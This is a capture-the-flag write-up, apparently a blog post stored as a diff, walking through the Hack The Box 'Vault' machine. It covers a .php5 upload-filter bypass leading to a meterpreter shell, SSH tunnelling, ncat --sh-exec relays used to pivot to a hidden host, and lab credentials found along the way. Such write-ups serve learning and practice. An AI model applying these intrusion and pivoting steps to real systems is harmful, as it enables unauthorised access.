@@ -1,0 +1,129 @@
+I"�<p>Vault is easily one of my favourite boxes on htb. It taught me a lot about tunneling and moving through a network any way possible. This is one of the boxes i got truely stuck into for days and could not stop thinking about what the next move was.</p>
+
+<h1 id="initial-nmap-scan">Initial Nmap scan</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
+|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
+|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+No exact OS matches for host
+</code></pre></div></div>
+
+<h1 id="first-webapp">First webapp</h1>
+<p>The initial webapp doesnt give too much away but what it does say is enough.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the Slowdaddy web interface
+We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.
+We are proud to announce our first client: Sparklays (Sparklays.com still under construction) 
+</code></pre></div></div>
+
+<p>We can infer from this that ‘sparklays’ will be a directory, we can add this to our directory bruteforcer to find the relevant files.
+/sparklays/admin.php - login prompt
+/sparklays/login.php - ‘access denied’
+/sparklays/design/uploads - file upload</p>
+
+<h1 id="landing-a-shell">Landing a shell</h1>
+<p>Testing some file uploads, its clear we cant upload anything with a .php extension, .php5 however, works just fine. Navigating to the page with our file executes and we get our meterpreter session.
+The directory listing on the server is as follows:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>home/alex
+home/dave
+	servers.txt;
+		DNS + Configurator - 192.168.122.4
+		Firewall - 192.168.122.5
+		The Vault - x
+	key.txt;
+		itscominghome
+	ssh.txt;
+		Dav3therav3123
+</code></pre></div></div>
+<h1 id="second-webapp">Second webapp</h1>
+<p>We now have ssh creds for dave. We can now tunnel to access that page we couldnt reach before.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 8888:192.168.122.4:80 dave@10.10.10.109
+</code></pre></div></div>
+<p>This page looks to be a testing page for a vpn config. Theres also a /notes directory which contains the following</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 123.ovpn and script.sh to 777
+</code></pre></div></div>
+
+<p>I found this handy guide on the best way to exploit this vpn testing page for code execution (link)</p>
+
+<p>We can use nc as a listener on daves system because where in the dns. Now we land as root @ dns and we can get the user flag.</p>
+
+<p>Theres a new ssh file in the dave directory on the dns now.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>theres also a ‘ssh’ file in the dave dir
+root@DNS:/home/dave# cat ssh
+cat ssh
+dave
+dav3gerous567
+</code></pre></div></div>
+
+<p>Looks like a password or something but doesnt work on the initial site. We will have to keep it for later.</p>
+
+<h1 id="breakpoint-1">breakpoint 1</h1>
+<p>At this point, what do we know.</p>
+<ul>
+  <li>We are root@dns when we want</li>
+  <li>We know there is an alex user</li>
+  <li>We have unused passwords;
+    <ul>
+      <li>itscominghome</li>
+      <li>dav3gerous567</li>
+    </ul>
+  </li>
+  <li>We have the address of vault - 192.168.5.2</li>
+</ul>
+
+<h1 id="getting-to-the-end">Getting to the end</h1>
+
+<p>Checking /var/log/auth.log we get an interesting result.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/ncat -l 1235 --sh-exec ncat 192.168.5.2 987 -p 53
+</code></pre></div></div>
+
+<p>From this we get an idea of what we have to do. We have to use netcat to inject another netcat for us to connect to.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &amp;
+use the ampersand to background it
+ssh dave@192.168.122.4 -p 1234
+    
+we get in
+    
+dave@vault:~$ ls
+root.txt.gpg
+</code></pre></div></div>
+
+<p>We have our root flag right here but we cant decrypt yet.
+We will have to move it from vault &gt; dns &gt; ubuntu.</p>
+
+<h1 id="root-flag">Root flag</h1>
+<p>oh jeez, weve come this far, and now we need to go back.
+We have a GPG encrypted file (root flag) but the key is on the first system, since gpg works the way it works, we have to move it to that first system where the key is.
+I chose to move the file with scp but in hindsight there was probably a better way of doing this.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dave@DNS:/tmp$ scp -P 1331 dave@192.168.122.4:/home/dave/root.txt.gpg /tmp
+The authenticity of host '[192.168.122.4]:1331 ([192.168.122.4]:1331)' can't be established.
+ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.
+Are you sure you want to continue connecting (yes/no)? yse
+Please type 'yes' or 'no': yes
+Warning: Permanently added '[192.168.122.4]:1331' (ECDSA) to the list of known hosts.
+dave@192.168.122.4's password: 
+root.txt.gpg                                                                                                                                      100%  629     0.6KB/s   00:00    
+[1]+  Done                    sudo ncat -l 1331 --sh-exec "ncat 192.168.5.2 987 -p 4444"
+
+dave@ubuntu:~$ scp dave@192.168.122.4:/tmp/root.txt.gpg .
+dave@192.168.122.4's password: 
+root.txt.gpg                                                                                                                                      100%  629     0.6KB/s   00:00    
+dave@ubuntu:~$ gpg -d root.txt.gpg
+
+You need a passphrase to unlock the secret key for
+user: "david &lt;dave@david.com&gt;"
+4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)
+
+gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
+      "david &lt;dave@david.com&gt;"
+&lt;flag redacted&gt;
+</code></pre></div></div>
+<p>Once back on the first system and decoding the flag, gpg asks for a password and weve had it all this time
+Decrypting with the key gives us our flag to submit.</p>
+
+:ET
